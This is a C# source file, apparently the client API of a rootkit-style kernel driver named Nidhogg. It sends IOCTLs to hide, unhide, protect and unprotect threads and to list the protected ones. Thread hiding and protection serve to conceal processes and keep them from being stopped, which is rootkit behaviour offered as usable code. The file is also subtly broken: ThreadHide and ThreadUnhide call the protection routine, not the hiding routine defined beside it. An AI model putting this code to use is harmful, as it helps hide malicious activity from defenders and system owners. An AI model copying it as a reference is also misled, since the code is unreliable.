using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private NidhoggErrorCodes ThreadProtection(uint tid, bool protect)
        {
            ProtectedThread protectedThread = new ProtectedThread
            {
                Tid = tid,
                Protect = protect
            };

            return NidhoggSendDataIoctl(protectedThread, IOCTL_PROTECT_UNPROTECT_THREAD);
        }

        private NidhoggErrorCodes ThreadHiding(uint tid, bool hide)
        {
            HiddenThread hiddenThread = new HiddenThread
            {
                Tid = tid,
                Hide = hide
            };
            return NidhoggSendDataIoctl(hiddenThread, IOCTL_HIDE_UNHIDE_THREAD);
        }

        public NidhoggErrorCodes ThreadProtect(uint tid)
        {
            return ThreadProtection(tid, true);
        }

        public NidhoggErrorCodes ThreadUnprotect(uint tid)
        {
            return ThreadProtection(tid, false);
        }

        public NidhoggErrorCodes ThreadHide(uint tid)
        {
            return ThreadProtection(tid, true);
        }

        public NidhoggErrorCodes ThreadUnhide(uint tid)
        {
            return ThreadProtection(tid, false);
        }

        public NidhoggErrorCodes ThreadClearAllProtection()
        {
            if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_THREAD_PROTECTION,
                IntPtr.Zero, 0, IntPtr.Zero, 0, out uint _, IntPtr.Zero))
                return NidhoggErrorCodes.NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

            return NidhoggErrorCodes.NIDHOGG_SUCCESS;
        }
        public uint[] QueryProtectedThreads()
        {
            OutputThreadsList threadsList;
            uint[] threads;

            threadsList = new OutputThreadsList
            {
                TidsCount = 0
            };

            threadsList = NidhoggRecieveDataIoctl(threadsList, IOCTL_QUERY_PROTECTED_THREADS);

            if (threadsList.TidsCount == 0)
                return null;
            threads = new uint[threadsList.TidsCount];

            for (int i = 0; i < threadsList.TidsCount; i++)
            {
                threads[i] = threadsList.Threads[i];
            }

            return threads;
        }
    }
}